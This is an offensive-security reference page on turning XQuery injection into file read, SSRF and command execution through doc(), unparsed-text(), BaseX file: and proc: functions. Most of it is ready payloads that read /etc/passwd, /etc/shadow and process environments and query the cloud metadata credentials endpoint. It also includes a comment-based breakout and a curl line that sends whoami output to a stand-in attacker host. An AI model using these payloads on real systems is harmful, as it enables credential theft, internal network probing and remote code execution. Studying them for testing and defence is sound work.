---
title: "XQuery library function abuse: file read, SSRF, and command execution"
description: "Reachable built-in and vendor functions like doc(), fn:collection(), fn:unparsed-text(), and BaseX proc:system turn an injection into file read, SSRF, and RCE."
keywords:
  - XQuery function abuse
  - doc SSRF
  - fn:unparsed-text file read
  - BaseX proc:system
  - file:read-text
---

# Library function abuse

Once an injection reaches expression position, the attacker can call any function the processor exposes, not just rewrite predicates. The standard library already reaches outside the database, and vendor modules extend that to arbitrary file read and command execution. Which functions are callable depends on the engine and its configured permissions, so enumeration starts with the portable built-ins and escalates to vendor extensions.

## Standard document and text functions

`fn:doc()` and `fn:collection()` resolve a URI and parse the response as XML, so they read XML documents from disk and reach any `http://` URI the server can, acting as an SSRF proxy for XML endpoints:

```xquery
' or doc('file:///opt/app/config.xml')//text() or '
doc('http://internal-admin.svc.local/users.xml')
```

Because `fn:doc()` requires well-formed XML, plain-text and JSON targets (most Linux config files, `/etc/hostname`, and the cloud metadata responses) make it abort with a parse error. For those, `fn:unparsed-text()` and `fn:unparsed-text-lines()` return the raw bytes as a string and are the right primitive:

```xquery
unparsed-text('file:///etc/passwd')
unparsed-text('file:///etc/hostname')
unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
```

The cloud metadata endpoint is a frequent target because the response flows straight back through the query result. Both functions also accept remote URIs, giving an SSRF channel and an exfiltration sink that embeds attacker-chosen content in the output. `fn:json-doc()` and `fn:parse-json()` handle JSON endpoints similarly.

## Vendor file modules

BaseX ships a `file` module that reads and lists the filesystem directly, bypassing the XML-parsing requirement entirely:

```xquery
file:read-text('/etc/passwd')
file:list('/home/')
file:read-text('/proc/self/environ')
```

eXist-db exposes comparable `util:` and `file:` helpers, and MarkLogic offers `xdmp:document-get()` and `xdmp:filesystem-file()`. Enumerating the installed modules with `fn:function-lookup()` or by probing namespace prefixes reveals which of these are reachable.

## Command execution

BaseX's `proc` module runs external programs, which converts the injection into full command execution in the service account's context:

```xquery
proc:system('id')
proc:system('bash', ('-c', 'curl http://attacker/$(whoami)'))
proc:execute('/bin/sh', ('-c', 'cat /etc/shadow'))
```

`proc:execute` returns stdout, stderr, and the exit code as XML, so output comes straight back through the result. MarkLogic's `xdmp:spawn` and `xdmp:eval` allow dynamic evaluation of attacker-supplied XQuery, a parallel path to the same outcome when the module is enabled.

## Chaining through injection

Delivered through a FLWOR breakout, these calls ride inside an otherwise valid query:

```
x' return proc:system('id') (: '
```

The `(:` opens an XQuery comment that swallows the trailing fragment of the original query, keeping the whole expression parseable while the injected `proc:system` executes.

## Tools

- **Burp Suite**: delivering function-abuse payloads and reading returned output.
- **Burp Collaborator**: confirming blind SSRF from `doc()` and `unparsed-text()`.
- Manual testing with `unparsed-text()`, `file:read-text`, and `proc:system` payloads.

## References

- [W3C XPath/XQuery Functions 3.1: fn:unparsed-text](https://www.w3.org/TR/xpath-functions-31/#func-unparsed-text)
- [BaseX Documentation: Process Module](https://docs.basex.org/wiki/Process_Module)
- [PayloadsAllTheThings: XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
